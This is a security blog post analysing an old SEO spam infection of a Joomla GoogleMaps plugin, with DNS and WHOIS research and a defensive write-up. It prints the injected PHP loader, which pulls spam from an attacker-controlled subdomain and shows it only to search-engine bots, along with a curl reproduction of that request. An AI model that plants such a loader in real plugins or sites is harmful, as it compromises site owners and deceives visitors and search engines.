@@ -1,0 +1,111 @@
+Throwback Threat Thursday: Joomla GoogleMaps Plugin SEO Spam Injection
+
+Throwback Threat Thursday is a series of posts where we recall older vulnerabilities that have since been patched by their developers. In the past, these vulnerabilities caused significant impacts to the security of website owners. Some vulnerable sites may be still be found in wild.
+
+When our tools don’t automatically detect and clean malicious code, that’s when we start our investigation process—and the majority of these research findings end up on the blog or as a Labs note.
+However, other times we update our tools to automatically detect and remediate the malware, then stash the code sample in our zoo along with some research notes… And there it stays, gathering dust, spiderwebs, and other nasty stuff.
+Revisiting those old notes and malicious code samples to re-evaluate them is not only a good research exercise, but also interesting to share. Now, please enjoy this research by Bruno Zanelato.
+Spam Campaigns Target Bing & GoogleBot User Agents
+When installed on the system, this particular piece of SEO malware loads its payload only for specific user agents like Bing and GoogleBot.
+Based on our notes, we initially noticed a correlation between compromised Joomla websites using a plugin called Google Maps, which displays one or more Google Maps within content-items.
+Here are the highlights regarding the original investigation made in 2017.
+Key Points:
+
+Spam content is loaded only with Googlebot and Bing User Agents;
+Occurs almost exclusively with websites in Europe, especially from Germany (.de) and Netherlands (.nl);
+WordPress websites are also being affected, however we only had the opportunity to analyze the Joomla version of the code;
+The malicious code is not bundled with the original versions of the GoogleMaps plugin available at GoogleMaps website, Github and Joomla extension directory page;
+The plugin’s website was compromised and the malware pulls the attackers spam content from this location.
+
+The Infection
+We first came across this campaign when our client noticed spam whenever they loaded their website. As soon as we switched the default browser user agent to BingBot or Googlebot, we were able to see the content.
+Here are the results for Bingbot: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+
+As seen above, spam content is injected into the body of the page. All of the links lead site visitors to hxxp://www.casinoonline[.]de[.]com/.
+Let’s take a better look at this domain:
+
+Technical Details
+During our research, we were able to track down the requests and grab more information about the code. We ended up identifying the following snippet located within the file “./plugins/system/plugin_googlemap3/plugin_googlemap3.php”.
+As stated before, this snippet is not located in the original versions of the plugin and was added by the malicious actor.
+try{
+$credit=@file_get_contents('hxxp://ww[.]mapsplugin[.]com/bro/3/'.$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] .'QQQ'. $_SERVER['HTTP_USER_AGENT'].'QQQEND',false,$ctx);
+echo '<!-- hxxp://ww[.]mapsplugin[.]com/bro/3/'.$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] .'QQQ'. $_SERVER['HTTP_USER_AGENT'].'QQQEND -->';
+} catch (Exception $e) {
+}
+
+echo $credit;
+define('CREDIT', 'c');
+The first thing that caught my attention was the fact that the function is trying to connect to the ww subdomain of the website, instead of regular www, which makes me believe that the attackers used a less typical approach. Instead of uploading the malicious code into the website, they added a new DNS entry to point to another server they control.
+$ host ww[.]mapsplugin[.]com
+
+ww[.]mapsplugin[.]com has address 34.196.229.25
+
+$ host www[.]mapsplugin[.]com
+
+www[.]mapsplugin[.]com has address 67.212.83.150
+The reverse DNS of the ip address “34.196.229.25” shows that it’s being hosted by Amazon, and not by Netelligent Hosting Services Inc. as seen for “ 67.212.83.150”. This is more evidence indicating that something isn’t right.*
+(*Note: At the time of this publishing, both www and ww are now hosted on Amazon, including a w subdomain.)
+$ host 34.196.229.25 25.229.196.34.in-addr.arpa domain name pointer ec2-34-196-229-25.compute-1[.]amazonaws[.]com.
+The WHOIS information of the www version of mapsplugin.com is not currently hosted by Amazon.
+NetRange:       67.212.64.0 - 67.212.95.255
+
+CIDR:           67.212.64.0/19
+
+NetName:        NETEL-ARIN-BLK03
+
+NetHandle:      NET-67-212-64-0-1
+
+Parent:         NET67 (NET-67-0-0-0-0)
+
+NetType:        Direct Allocation
+
+OriginAS:       AS10929
+
+Organization:   Netelligent Hosting Services Inc. (NHS-31)
+
+RegDate:        2007-08-30
+
+Updated:        2012-03-02
+
+Ref:            https://whois.arin.net/rest/net/NET-67-212-64-0-1
+
+OrgName:        Netelligent Hosting Services Inc.
+
+OrgId:          NHS-31
+
+Address:        800 Square Victoria
+
+Address:        C.P. 118
+
+City:           Montreal
+
+StateProv:      QC
+
+PostalCode:     H4Z 1B7
+
+Country:        CA
+
+RegDate:        2005-03-09
+
+Updated:        2017-01-28
+
+Ref:            https://whois.arin.net/rest/org/NHS-31
+The Request
+Once we obtained access to the code, we were able to reproduce the request by using a simple curl command:
+$ curl "hxxp://ww[.]mapsplugin[.]com/bro/3/www.infectedwebsite.com/QQQMozilla/5.0%20(compatible;%20bingbot/2.0;%20+http://www.bing.com/bingbot.htm)QQQEND"
+
+Neben Spielhallen, die in vielen <a href="hxxp://www[.]casinoonline[.]de[.]com">www[.]casinoonline[.]de[.]com</a> deutschen Städten zu Portale vor <a href="hxxp://www[.]casinoonline[.]de[.]com/888-casino-testbericht/">888 Testbericht</a>, <a href="hxxp://www[.]casinoonline[.]de[.]com/deutschlands-beste-casino-online-im-vergleich/"> beste Casino Online im Vergleich</a> <a href="hxxp://www[.]casinoonline[.]de[.]com/jackpot-city-casino-testbericht/">JackpotCity</a>, <a href="hxxp://www[.]casinoonline[.]de[.]com/betway-casino-testbericht/">Betway</a> Und heutzutage mit dem.
+As seen above, the spam content is actually loaded by ww[.]mapsplugin[.]com. The attackers seem to have some kind of control over the server, because the request is only loaded with the infected website.
+If we swap the string in the curl request with a different website, for example “sucuri.net”, we are unable to reproduce the content.
+SEO Spam: What It Means for Website Owners
+It’s not new that we’re writing about spam campaigns or their related malware.
+Since the very beginning of Sucuri, we’ve received endless reports from clients complaining about spam content on website pages, as well as in SERP (Search Engine Results Page) results.
+SEO spam is definitely one of the worst spam tactics on the internet—and it’s becoming more common every day.
+One of the top three attacks we’re seeing on the web, it’s quickly pushing its way up to number one. In fact, our latest Hacked Website Report found that over 50% of all remediated websites were related to SEO spam. In these campaigns, bad actors target innocent websites to abuse site rankings and link to spam.
+SEO attacks are becoming so prevalent that attackers are constantly working on finding new techniques to hide the code, making detection more difficult in a large portion of the cases.
+Back to the Future
+Revisiting this case, we see that the plugin was removed from Joomla’s site back in October 2017 due to this malicious injection—however, an outdated version that does not include this malicious injection is still available on GitHub.
+The project was abandoned in 2015. The good news is that, based on our detection, the community found the issue and provided a fix for it. It hasn’t seen updates since then. The bad news is that we found at least 7076 sites running a potentially compromised version of this plugin.
+The plugin owner, Mike Reumer, is not very active on Social Media or GitHub. I tried to contact him anyways to get his side of the story, but have not received an answer at this time.
+While the malware is dormant right now, anyone who controls the ww domain can still inject malicious content on affected sites. This highlights the importance of removing old, unused plugins from your CMS to mitigate the risk of SEO spam on your website.
+The injected domain, hxxp://www[.]casinoonline[.]de[.]com, is still online but not using any blackhat SEO to bring more visitors. Good for them. 🙂
